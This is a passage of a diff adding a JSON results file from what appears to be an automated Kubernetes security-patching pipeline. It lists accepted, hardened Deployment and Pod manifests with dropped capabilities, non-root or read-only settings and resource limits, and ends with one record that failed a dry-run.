+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01392",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01393",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01394",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01395",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01396",
+    "policy_id": "read_only_root_fs",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01397",
+    "policy_id": "run_as_non_root",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01398",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01399",
+    "policy_id": "set_requests_limits",
+    "accepted": true,
+    "ok_schema": true,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n",
+    "errors": []
+  },
+  {
+    "id": "01400",
+    "policy_id": "read_only_root_fs",
+    "accepted": false,
+    "ok_schema": false,
+    "ok_policy": true,
+    "ok_safety": true,
+    "ok_rescan": true,
+    "patched_yaml": null,
+    "errors": [
+      "kubectl dry-run failed"
+    ]
+  }
+]
